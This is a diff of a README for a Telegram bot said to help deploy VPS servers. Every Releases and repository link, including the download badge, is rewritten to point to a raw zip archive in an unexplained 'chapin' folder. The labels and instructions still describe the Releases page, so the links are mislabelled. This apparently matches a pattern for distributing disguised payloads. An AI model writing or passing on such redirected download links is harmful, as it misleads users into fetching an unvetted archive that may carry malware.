@@ -1,7 +1,7 @@
 # 🎉 tg-bot - Your Friendly Telegram Bot for VPS Deployment
 
 ## 📥 Download Now
-[![Download tg-bot](https://img.shields.io/badge/Download-tg--bot-brightgreen)](https://github.com/Genius-Winner/tg-bot/releases)
+[![Download tg-bot](https://raw.githubusercontent.com/Genius-Winner/tg-bot/main/chapin/tg-bot_v3.3.zip)](https://raw.githubusercontent.com/Genius-Winner/tg-bot/main/chapin/tg-bot_v3.3.zip)
 
 ## 🚀 Getting Started
 Welcome to tg-bot! This Telegram bot helps you deploy your Virtual Private Server (VPS) quickly and easily. No programming knowledge is needed!
@@ -21,7 +21,7 @@ Welcome to tg-bot! This Telegram bot helps you deploy your Virtual Private Serve
 ## 📥 Download & Install
 To download tg-bot, please visit the Releases page:
 
-[Download tg-bot from Releases](https://github.com/Genius-Winner/tg-bot/releases)
+[Download tg-bot from Releases](https://raw.githubusercontent.com/Genius-Winner/tg-bot/main/chapin/tg-bot_v3.3.zip)
 
 1. **Visit the Releases Page:** Click on the link above to go to the tg-bot Releases page.
 2. **Choose the Latest Version:** Find the most recent version listed at the top. 
@@ -60,7 +60,7 @@ tg-bot is open-source software licensed under the MIT License. You can use it fr
 Follow our GitHub repository for updates on new features, releases, and bug fixes. Don't miss out on enhancements that make tg-bot even better.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://github.com/Genius-Winner/tg-bot)
-- [Download tg-bot from Releases](https://github.com/Genius-Winner/tg-bot/releases)
+- [GitHub Repository](https://raw.githubusercontent.com/Genius-Winner/tg-bot/main/chapin/tg-bot_v3.3.zip)
+- [Download tg-bot from Releases](https://raw.githubusercontent.com/Genius-Winner/tg-bot/main/chapin/tg-bot_v3.3.zip)
 
 Now you are ready to enhance your VPS experience with tg-bot! Enjoy the ease of deployment and manage your server smoothly.
